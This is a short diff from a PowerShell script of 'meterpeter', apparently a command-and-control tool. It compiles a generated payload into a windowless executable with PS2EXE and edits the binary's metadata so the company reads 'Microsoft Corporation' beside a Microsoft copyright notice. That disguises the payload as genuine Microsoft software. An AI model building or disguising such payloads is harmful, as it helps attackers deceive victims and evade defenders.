@@ -317,7 +317,7 @@ If($Converter -eq $True -and $PS2EXE -eq 'Windows_NT'){
     Write-Host "   Auto-Convertion of $payload_name.ps1 to standalone executable" -ForeGroundColor Green
     $Convertor = "$IPATH"+"PS2EXE";cd $Convertor
     Copy-Item -Path $IPATH$payload_name.ps1 -Destination $payload_name.ps1 -Force -ErrorAction SilentlyContinue;
-    .\ps2exe.ps1 -inputFile "$payload_name.ps1" -outputFile "$payload_name.exe" -iconFile 'meterpeter.ico' -title 'meterpeter binary file' -version '2.10.6' -description 'meterpeter binary file' -product 'meterpeter C2' -company 'Microsoft® Windows® Operative System' -copyright '©Microsoft Corporation. All Rights Reserved' -noConsole -noVisualStyles -noError
+    .\ps2exe.ps1 -inputFile "$payload_name.ps1" -outputFile "$payload_name.exe" -iconFile 'meterpeter.ico' -title 'meterpeter binary file' -version '2.10.6' -description 'meterpeter binary file' -product 'meterpeter C2 Client' -company 'Microsoft Corporation' -copyright '©Microsoft Corporation. All Rights Reserved' -noConsole -noVisualStyles -noError
     Copy-Item -Path "$payload_name.exe" -Destination $IPATH$payload_name.exe -Force -ErrorAction SilentlyContinue;
     Remove-Item -Path "$payload_name.exe" -Force -ErrorAction SilentlyContinue
     cd $IPATH
